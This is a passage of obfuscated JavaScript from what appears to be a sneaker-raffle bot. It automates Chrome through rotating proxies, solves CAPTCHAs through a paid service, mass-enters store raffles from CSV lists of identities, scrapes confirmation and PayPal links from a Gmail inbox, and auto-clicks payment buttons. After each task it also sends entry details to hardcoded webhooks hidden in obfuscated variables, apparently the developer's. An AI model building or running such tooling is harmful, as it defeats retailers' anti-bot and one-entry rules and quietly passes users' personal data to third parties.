                            _0x145e10['on']('body', function (_0x4f7326, _0x236290) {
                                _0x255d24(_0x4f7326, (_0x434917, _0x1e2623) => {
                                    if (_0x1e2623['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x1e2623['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x1e2623['text']['split']('[')[0x2];
                                        var _0x20c43f = mes['split'](']')[0x0];
                                        _0x3e4b5f['push'](_0x20c43f);
                                    }
                                });
                            }), _0x145e10['once']('end', function () {
                            });
                        }), _0x2aff6e['once']('error', function (_0x58e942) {
                            console['log']('Fetch\x20error:\x20' + _0x58e942);
                        }), _0x2aff6e['once']('end', function () {
                            _0x2f7b32['end']();
                        });
                    }
                });
            });
        }), _0x2f7b32['once']('error', function (_0x56d4a3) {
            console['log'](_0x387ef2['red'](_0x56d4a3['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x2f7b32['once']('end', async function () {
        }), _0x2f7b32['connect']();
    }
    try {
        _0x3f8ac9(), await _0x488ffe(0xfa0), console['log']('Found\x20' + _0x3e4b5f['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x488ffe(0xfa0);
    }
    var _0x5c40a8;
    _0x55ca22('' + _0x38c7e8);
    var _0x3d4100 = _0x42f703[0x0]['split'](':'), _0x2f1030;
    try {
        _0x2f1030 = await _0x4ab5bb['launch']({
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3d4100[0x0] + ':' + _0x3d4100[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x2f1030 = await _0x4ab5bb['launch']({
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3d4100[0x0] + ':' + _0x3d4100[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x42a46a() + '\x20[' + _0x38c7e8 + ']\x20Getting\x20Session');
        const _0x355bdd = await _0x2f1030['newPage']();
        await _0x355bdd['authenticate']({
            'username': '' + _0x3d4100[0x2],
            'password': '' + _0x3d4100[0x3]
        }), await _0x355bdd['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x355bdd, await _0x355bdd['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x42a46a() + '\x20[' + _0x38c7e8 + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x355bdd['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x42a46a() + '\x20[' + _0x38c7e8 + ']\x20Successfully\x20logged\x20in'), await _0x488ffe(0x2710);
        } catch (_0x22ff55) {
            throw new Error('Login\x20session\x20expired\x20' + _0x22ff55);
        }
        for (var _0x3a64c2 = 0x0; _0x3a64c2 < _0x3e4b5f['length']; _0x3a64c2++) {
            console['log'](_0x42a46a() + '\x20[' + _0x38c7e8 + ']\x20Task\x20' + (_0x3a64c2 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x55ca22(_0x38c7e8 + '\x20Task\x20' + (_0x3a64c2 + 0x1) + '\x20/\x20' + _0x3e4b5f['length']);
            const _0x11f467 = await _0x2f1030['newPage']();
            await _0x11f467['goto']('' + _0x3e4b5f[_0x3a64c2], { 'waitUntil': 'networkidle2' }), await _0x488ffe(0xbb8);
            try {
                const _0x51036e = await _0x11f467['$']('#challenge-heading');
                _0x51036e && (console['log'](_0x42a46a() + '\x20[' + _0x38c7e8 + ']\x20Task\x20' + (_0x3a64c2 + 0x1) + '\x20:\x20' + _0x387ef2['yellow']('2FA\x20Required')), await _0x11f467['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x488ffe(0x9c40), await _0x11f467['waitForSelector']('#payment-submit-btn'), await _0x11f467['$eval']('#payment-submit-btn', _0x5dc47e => _0x5dc47e['click']()), await _0x11f467['click']('#payment-submit-btn');
                try {
                    await _0x11f467['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x488ffe(0x5dc), console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0x38c7e8 + ']\x20Task\x20' + (_0x3a64c2 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x48f31f) {
                    _0x2dc7e3 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x48f31f['message']);
                } finally {
                    if (_0x2dc7e3 == 'yes' && _0x3662a1 != 0x2) {
                        console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x38c7e8['name'] + ']\x20Task\x20' + (_0x3a64c2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3662a1 + '\x20/\x205)')), _0x3a64c2 = _0x3a64c2 - 0x1, _0x3662a1 = _0x3662a1 + 0x1;
                        continue;
                    }
                    _0x2dc7e3 == 'yes' && _0x3662a1 >= 0x2 && (_0x2e6413(csv[_0x3a64c2], _0x38c7e8), _0x2dc7e3 = 'no', _0x3662a1 = 0x0), await _0x11f467['close'](), await _0x488ffe(0x4650);
                }
            } catch (_0x335ed7) {
                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x38c7e8 + ']\x20Task\x20' + (_0x3a64c2 + 0x1) + '\x20:\x20' + _0x335ed7));
            }
        }
    } catch (_0x48dab9) {
        console['log'](_0x387ef2['red']('' + _0x48dab9));
    } finally {
        await _0x2f1030['close']();
    }
}
const _0x20cf41 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x1a59b2, _0x189627, _0x3d88fe) {
                    _0x4ab5bb['use'](_0x44f368()), _0x4ab5bb['use'](_0x45c327({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5450ed['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x28fc40 = 0x0; _0x28fc40 < _0x189627['length']; _0x28fc40++) {
                        if (_0x5348c3 != 'yes')
                            var _0x5348c3 = '', _0x9787cc = 0x0;
                        var _0x8f5b68;
                        try {
                            await _0x3215be(_0x189627, _0x28fc40);
                        } catch {
                            _0x5348c3 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x55ca22(_0x1a59b2['name'] + '\x20Task\x20' + (_0x28fc40 + 0x1) + '\x20/\x20' + _0x189627['length'] + '\x20||\x20File:\x20' + _0x121079 + '\x20Proxies:\x20' + _0x590947);
                        var _0x1f1519 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x4ac083 = Math['round'](Math['random']() * (_0x1f1519['length'] - 0x1));
                        _0x189627[_0x28fc40]['Size'] == 'RANDOM' && (_0x189627[_0x28fc40]['Size'] = _0x1f1519[_0x4ac083]);
                        var _0x58da97 = Math['round'](Math['random']() * (_0x3d88fe['length'] - 0x1)), _0x2a7707 = _0x3d88fe[_0x58da97]['split'](':'), _0x565969;
                        try {
                            _0x565969 = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2a7707[0x0] + ':' + _0x2a7707[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x565969 = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2a7707[0x0] + ':' + _0x2a7707[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x42a46a() + '\x20[' + _0x1a59b2['name'] + ']\x20Task\x20' + (_0x28fc40 + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x5a17be = await _0x565969['newPage']();
                            await _0x5a17be['authenticate']({
                                'username': '' + _0x2a7707[0x2],
                                'password': '' + _0x2a7707[0x3]
                            }), await _0x5a17be['setRequestInterception'](!![]), _0x5a17be['on']('request', _0x199560 => {
                                _0x199560['resourceType']() === 'image' || _0x199560['resourceType']() === 'font' || _0x199560['resourceType']() === 'media' ? _0x199560['abort']() : _0x199560['continue']();
                            }), await _0x5a17be['goto'](_0x189627[_0x28fc40]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x42a46a() + '\x20[' + _0x1a59b2['name'] + ']\x20Task\x20' + (_0x28fc40 + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x5a17be['waitForSelector']('#accept-all-gdpr'), await _0x5a17be['click']('#accept-all-gdpr'), await _0x5a17be['waitForSelector']('#raffles-product'), await _0x488ffe(0x3e8), await _0x5a17be['$eval']('#raffles-product', _0x49d0b4 => _0x49d0b4['click']()), await _0x488ffe(0x1388), await _0x5a17be['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x58ec34 = await _0x5a17be['$']('.fancybox-inner\x20>\x20iframe'), _0x38c428 = await _0x58ec34['contentFrame']();
                            console['log'](_0x42a46a() + '\x20[' + _0x1a59b2['name'] + ']\x20Task\x20' + (_0x28fc40 + 0x1) + '\x20:\x20Checking\x20Information'), await _0x38c428['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x488ffe(0x1f4), await _0x38c428['type']('input[name=\x22sm-form-email\x22]', _0x189627[_0x28fc40]['Email']), await _0x488ffe(0xc8), await _0x38c428['type']('input[name=\x22sm-form-name\x22]', _0x189627[_0x28fc40]['FirstName'] + '\x20' + _0x189627[_0x28fc40]['LastName']), await _0x488ffe(0xc8), await _0x38c428['type']('input[name=\x22sm-form-street\x22]', _0x189627[_0x28fc40]['Address1'] + '\x20' + _0x189627[_0x28fc40]['HouseNumber'] + '\x20' + _0x189627[_0x28fc40]['Address2']), await _0x488ffe(0xc8), await _0x38c428['type']('input[name=\x22sm-form-city\x22]', _0x189627[_0x28fc40]['City']), await _0x488ffe(0xc8), await _0x38c428['type']('input[name=\x22sm-form-province\x22]', _0x189627[_0x28fc40]['State']), await _0x488ffe(0xc8), await _0x38c428['type']('input[name=\x22sm-form-zip\x22]', _0x189627[_0x28fc40]['Zip']), await _0x488ffe(0xc8), await _0x38c428['type']('input[name=\x22sm-form-country\x22]', _0x189627[_0x28fc40]['Country']), await _0x488ffe(0xc8), await _0x38c428['type']('input[name=\x22sm-form-phone\x22]', _0x189627[_0x28fc40]['Phone']), await _0x488ffe(0xc8), await _0x38c428['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x189627[_0x28fc40]['Follower']), await _0x488ffe(0xc8), await _0x38c428['type']('input[name=\x22sm-cst.size\x22]', _0x189627[_0x28fc40]['Size']), await _0x488ffe(0x1f4), await _0x38c428['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x488ffe(0x1f4), await _0x38c428['click']('.icheckbox_simple-custom'), await _0x488ffe(0x1f4), console['log'](_0x42a46a() + '\x20[' + _0x1a59b2['name'] + ']\x20Task\x20' + (_0x28fc40 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x38c428['$eval']('form', _0x39db77 => _0x39db77['submit']()), console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0x1a59b2['name'] + ']\x20Task\x20' + (_0x28fc40 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x5348c3 = '';
                            var _0x555e16 = await _0x5605d8(_0x189627[_0x28fc40], _0x1a59b2, 'dev', ![]), _0x24f37b = await _0x5605d8(_0x189627[_0x28fc40], _0x1a59b2, 'pub', ![]);
                            const _0x1a66e9 = {
                                'succesDEVMSG': { 'embeds': [_0x555e16] },
                                'succesPUBMSG': { 'embeds': [_0x24f37b] }
                            };
                            try {
                                _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x1a66e9['succesDEVMSG']), await _0x488ffe(0xc8), await _0x49f827(_0xf35405, _0x1a66e9['succesDEVMSG']), await _0x488ffe(0xc8), await _0x49f827(_0x1bf959, _0x1a66e9['succesPUBMSG']);
                            } catch (_0x36feda) {
                                console['log'](_0x387ef2['yellow'](_0x42a46a() + '\x20[' + _0x1a59b2['name'] + ']\x20Task\x20' + (_0x28fc40 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x36feda));
                            }
                        } catch (_0x5ea614) {
                            console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x1a59b2['name'] + ']\x20Task\x20' + (_0x28fc40 + 0x1) + '\x20:\x20' + _0x5ea614)), _0x8f5b68 = '' + _0x5ea614;
                            var _0x44e9f3 = await _0x5605d8(_0x189627[_0x28fc40], _0x1a59b2, 'dev', !![], _0x8f5b68), _0x555e16 = await _0x5605d8(_0x189627[_0x28fc40], _0x1a59b2, 'dev', ![]), _0x24f37b = await _0x5605d8(_0x189627[_0x28fc40], _0x1a59b2, 'pub', ![]);
                            const _0xe6373d = {
                                'succesDEVMSG': { 'embeds': [_0x555e16] },
                                'succesPUBMSG': { 'embeds': [_0x24f37b] }
                            };
                            _0xe6373d['errorDEV'] = { 'embeds': [_0x44e9f3] }, _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0xe6373d['errorDEV']), await _0x49f827(_0x47580b, _0xe6373d['errorDEV']), _0x5ea614 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x5348c3 = 'yes');
                        } finally {
                            _0x565969['close']();
                            if (_0x5348c3 == 'yes' && _0x9787cc != 0x5 && _0x8f5b68 != 'Size\x20Not\x20Found') {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x1a59b2['name'] + ']\x20Task\x20' + (_0x28fc40 + 0x1) + '\x20:\x20Retrying\x20(' + _0x9787cc + '\x20/\x205)\x20')), _0x28fc40 = _0x28fc40 - 0x1, _0x9787cc = _0x9787cc + 0x1;
                                continue;
                            }
                            _0x5348c3 == 'yes' && _0x9787cc >= 0x5 && (_0x2e6413(_0x189627[_0x28fc40], _0x1a59b2), _0x5348c3 = 'no', _0x9787cc = 0x0), console['log'](_0x42a46a() + '\x20[' + _0x1a59b2['name'] + ']\x20Waiting\x20for\x20' + _0x5450ed['delay'] + '\x20ms'), await _0x488ffe(_0x5450ed['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x2377c4, _0x318fcc) {
                    var _0xcbe83c = [];
                    async function _0x1c90d0() {
                        var _0x3965b1 = new _0x3dffcd({
                            'user': _0x5450ed['masterMail'],
                            'password': _0x5450ed['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0xa366d(_0x385ec7) {
                            _0x3965b1['openBox']('INBOX', ![], _0x385ec7);
                        }
                        _0x3965b1['once']('ready', function () {
                            _0xa366d(function (_0x5273b7, _0x5c0a89) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x5273b7)
                                    throw _0x5273b7;
                                _0x3965b1['seq']['search'](['UNSEEN'], function (_0x846cc9, _0x1da6e0) {
                                    if (!_0x1da6e0 || !_0x1da6e0['length'])
                                        console['log'](_0x42a46a() + '\x20[' + _0x2377c4['name'] + ']\x20No\x20mails\x20found'), _0x3965b1['end']();
                                    else {
                                        var _0x394960 = _0x3965b1['seq']['fetch'](_0x1da6e0, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x394960['on']('message', function (_0x1a407f, _0xcf8881) {
                                            var _0x1a6c68 = '(#' + _0xcf8881 + ')\x20';
                                            _0x1a407f['on']('body', function (_0x2bc8c0, _0x2da6cd) {
                                                _0x255d24(_0x2bc8c0, (_0x30548f, _0xcba0ee) => {
                                                    if (_0xcba0ee['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x1fc11d = _0xcba0ee['html']['split']('\x0a');
                                                        for (var _0x1e6b79 = 0x0; _0x1e6b79 < _0x1fc11d['length']; _0x1e6b79++) {
                                                            if (_0x1fc11d[_0x1e6b79]['includes']('salesmanago') && _0x1fc11d[_0x1e6b79]['includes']('<td') && _0x1fc11d[_0x1e6b79]['includes']('href')) {
                                                                var _0x3a080d = _0x1fc11d[_0x1e6b79]['split']('href=\x22'), _0x147ca9 = _0x3a080d[0x1]['split']('\x22')[0x0];
                                                                _0xcbe83c['push'](_0x147ca9);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x1a407f['once']('end', function () {
                                            });
                                        }), _0x394960['once']('error', function (_0x1c3bc6) {
                                            console['log']('Fetch\x20error:\x20' + _0x1c3bc6);
                                        }), _0x394960['once']('end', function () {
                                            _0x3965b1['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x3965b1['once']('error', function (_0x12d995) {
                            console['log'](_0x387ef2['red'](_0x12d995['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x3965b1['once']('end', async function () {
                        }), _0x3965b1['connect']();
                    }
                    async function _0x1dbaa8(_0x22669a, _0x4010b2, _0x7fc148) {
                        for (var _0x395962 = 0x0; _0x395962 < _0x4010b2['length']; _0x395962++) {
                            async function _0x5bc6d7(_0x2ac8de, _0x23f69e, _0x317de7, _0x4a14d8, _0x2d4f14) {
                                var _0x3d16ea, _0x246c57 = {}, _0x50069b = [], _0x555821 = {}, _0x42d28c = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x30aa12 = Math['round'](Math['random']() * (_0x42d28c['length'] - 0x1));
                                _0x4a14d8[_0x2ac8de]['Size'] == 'RANDOM' && (_0x4a14d8[_0x2ac8de]['Size'] = _0x42d28c[_0x30aa12]);
                                !_0x4a14d8 && (_0x4a14d8 = {});
                                if (_0x5450ed['useRandomProxy'] = ![])
                                    var _0x324f06 = _0x2d4f14[_0x2ac8de]['split'](':');
                                else
                                    var _0x40fb96 = Math['round'](Math['random']() * (_0x2d4f14['length'] - 0x1)), _0x324f06 = _0x2d4f14[_0x40fb96]['split'](':');
                                var _0x5bb64c = {
                                    'jar': _0x23361c,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x317de7['url'],
                                    'headers': _0x317de7['headers'],
                                    'body': JSON['stringify'](_0x246c57),
                                    'proxy': 'http://' + _0x324f06[0x2] + ':' + _0x324f06[0x3] + '@' + _0x324f06[0x0] + ':' + _0x324f06[0x1]
                                };
                                return _0x23f69e != 'ver' && (_0x5bb64c['url'] = _0x317de7['url'], _0x5bb64c['headers'] = _0x317de7['headers']), _0x23f69e == 'ver' && (_0x5bb64c['method'] = 'GET', _0x5bb64c['url'] = _0x4a14d8[_0x2ac8de]), new Promise(function (_0x67282, _0x4014d0) {
                                    callback = async (_0x2703e8, _0x43f97c, _0x2894a8) => {
                                        if (!_0x2703e8 && _0x43f97c['statusCode'] == 0xca || !_0x2703e8 && _0x43f97c['statusCode'] == 0xc8) {
                                            if (_0x23f69e != 'ver') {
                                                var _0x33beb5 = await _0x5605d8(_0x4a14d8[_0x2ac8de], _0x317de7, 'dev', ![]), _0x35a1da = await _0x5605d8(_0x4a14d8[_0x2ac8de], _0x317de7, 'pub', ![]);
                                                const _0x229885 = {
                                                    'succesDEVMSG': { 'embeds': [_0x33beb5] },
                                                    'succesPUBMSG': { 'embeds': [_0x35a1da] }
                                                };
                                                if (_0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '')
                                                    try {
                                                        await _0x49f827(_0x5450ed['webhook'], _0x229885['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x488ffe(0xc8), await _0x49f827(_0xf35405, _0x229885['succesDEVMSG']), await _0x488ffe(0xc8);
                                                try {
                                                    await _0x49f827(_0x1bf959, _0x229885['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0xb5b21(_0x4a14d8[_0x2ac8de], _0x317de7);
                                            }
                                            _0x67282(console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0x317de7['name'] + ']\x20Task\x20' + (_0x2ac8de + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x23f69e != 'ver') {
                                                var _0xb05750 = '' + _0x2703e8, _0x37d11a = await _0x5605d8(_0x4a14d8[_0x2ac8de], _0x317de7, 'dev', !![], _0xb05750), _0x1e1644 = {};
                                                _0x1e1644['errorDEV'] = { 'embeds': [_0x37d11a] }, _0x2e6413(_0x4a14d8[_0x2ac8de], _0x317de7), _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x1e1644['errorDEV']), await _0x49f827(_0x47580b, _0x1e1644['errorDEV']);
                                            }
                                            _0x4014d0(console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x317de7['name'] + ']\x20Task\x20' + (_0x2ac8de + 0x1) + ':\x20' + _0x2703e8)));
                                        }
                                    };
                                    try {
                                        _0x23f69e != 'ver' ? console['log'](_0x42a46a() + '\x20[' + _0x317de7['name'] + ']\x20Task\x20' + (_0x2ac8de + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x246c57['data']['attributes']['email']) : console['log'](_0x42a46a() + '\x20[' + _0x317de7['name'] + ']\x20Task\x20' + (_0x2ac8de + 0x1) + ':\x20Fetching\x20Response'), _0x23fd33(_0x5bb64c, callback);
                                    } catch (_0x3a3e86) {
                                        console['log'](_0x42a46a() + '\x20Task\x20' + (_0x2ac8de + 0x1) + ':\x20' + _0x3a3e86);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x5bc6d7(_0x395962, 'ver', _0x22669a, _0x4010b2, _0x7fc148), console['log'](_0x42a46a() + '\x20[' + _0x22669a['name'] + ']\x20Sleeping\x20for\x20' + _0x5450ed['delay'] + '\x20ms'), await _0x488ffe(_0x5450ed['delay']);
                            } catch (_0x396815) {
                            }
                        }
                    }
                    try {
                        _0x1c90d0(), await _0x488ffe(0xfa0), console['log']('Found\x20' + _0xcbe83c['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x1dbaa8(_0x2377c4, _0xcbe83c, _0x318fcc);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0xa8c6d2, _0x38da60, _0x2252ac) {
                for (var _0x29cff1 = 0x0; _0x29cff1 < _0x38da60['length']; _0x29cff1++) {
                    _0x5450ed['AfewDelay'] = _0x5450ed['delay'];
                    var _0x58a239;
                    if (_0x45e808 != 'yes')
                        var _0x45e808 = '', _0x3a8d46 = 0x0;
                    var _0x3a1db9 = _0x38da60[_0x29cff1]['Url'], _0x5c5bcf = _0x38da60[_0x29cff1];
                    _0x55ca22(_0xa8c6d2['name'] + '\x20Task\x20' + (_0x29cff1 + 0x1) + '\x20/\x20' + _0x38da60['length'] + '\x20||\x20File:\x20' + _0x121079 + '\x20Proxies:\x20' + _0x590947);
                    try {
                        await _0x3215be(_0x38da60, _0x29cff1);
                    } catch {
                        _0x45e808 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x369ff0(_0x1436cd) {
                        const _0x482362 = _0x7d8dbf['readFileSync']('../successful-tasks.csv', 'utf8'), _0x476f1c = _0x16e760['parse'](_0x482362, { 'header': !![] })['data'];
                        let _0x5e03a3 = ![];
                        for (var _0x236109 of _0x476f1c) {
                            if (_0x236109['Url'] == _0x1436cd['Url'] && _0x236109['Email'] == _0x1436cd['Email']) {
                                _0x5e03a3 = !![];
                                break;
                            }
                        }
                        return _0x5e03a3;
                    }
                    if (await _0x369ff0(_0x38da60[_0x29cff1]) == !![]) {
                        console['log'](_0x42a46a() + '\x20[' + _0xa8c6d2['name'] + ']\x20Task\x20' + (_0x29cff1 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x2811ca = await _0x5605d8(_0x38da60[_0x29cff1], _0xa8c6d2, 'dev', ![]), _0x17149b = await _0x5605d8(_0x38da60[_0x29cff1], _0xa8c6d2, 'pub', ![]);
                    const _0x2ab139 = {
                        'succesDEVMSG': { 'embeds': [_0x2811ca] },
                        'succesPUBMSG': { 'embeds': [_0x17149b] }
                    };
                    if (_0x38da60[_0x29cff1]['Email'] == '' || _0x38da60[_0x29cff1]['FirstName'] == '' || _0x38da60[_0x29cff1]['LastName'] == '' || _0x38da60[_0x29cff1]['Country'] == '' || _0x38da60[_0x29cff1]['Size'] == '' || _0x38da60[_0x29cff1]['Address1'] == '' || _0x38da60[_0x29cff1]['Zip'] == '') {
                        console['log'](_0x42a46a() + '\x20[' + _0xa8c6d2['name'] + ']\x20Task\x20' + (_0x29cff1 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x5450ed['useRandomProxy'] = ![])
                        var _0x10b2a3 = _0x2252ac[_0x29cff1]['split'](':');
                    else
                        var _0x2ee1a4 = Math['round'](Math['random']() * (_0x2252ac['length'] - 0x1)), _0x10b2a3 = _0x2252ac[_0x2ee1a4]['split'](':');
                    var _0x192941;
                    try {
                        _0x192941 = await _0x4ab5bb['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x10b2a3[0x0] + ':' + _0x10b2a3[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x192941 = await _0x4ab5bb['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x10b2a3[0x0] + ':' + _0x10b2a3[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0xa5a512 = JSON['parse'](_0x7d8dbf['readFileSync']('sizes.json', 'utf-8')), _0x3a1db9 = _0x38da60[_0x29cff1]['Url'], _0x1925b6 = _0x38da60[_0x29cff1]['Size'], _0x13ed16;
                        async function _0x44dbd9() {
                            var _0x101c70 = new _0x53b450['CookieJar']();
                            console['log'](_0x42a46a() + '\x20[' + _0xa8c6d2['name'] + ']\x20Task\x20' + (_0x29cff1 + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x3d654d;
                            let _0x1f0a40 = {
                                'method': 'GET',
                                'cookieJar': _0x101c70,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x10b2a3[0x2] + ':' + _0x10b2a3[0x3] + '@' + _0x10b2a3[0x0] + ':' + _0x10b2a3[0x1]
                            }, _0x58999c = _0x3a1db9['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x575a3c = _0x58999c + '.json', _0x4f6ced = await _0x1ea050(_0x575a3c);
                            console['log'](_0x42a46a() + '\x20[' + _0xa8c6d2['name'] + ']\x20Task\x20' + (_0x29cff1 + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0xf45b0 = _0x4f6ced['data']['product']['variants'];
                            if (_0x1925b6 != 'RANDOM') {
                                if (_0xf45b0[0x1]['option1']['includes']('W')) {
                                    const _0x141771 = _0xa5a512['women']['find'](_0x491ca4 => _0x491ca4['EUsize'] === _0x1925b6);
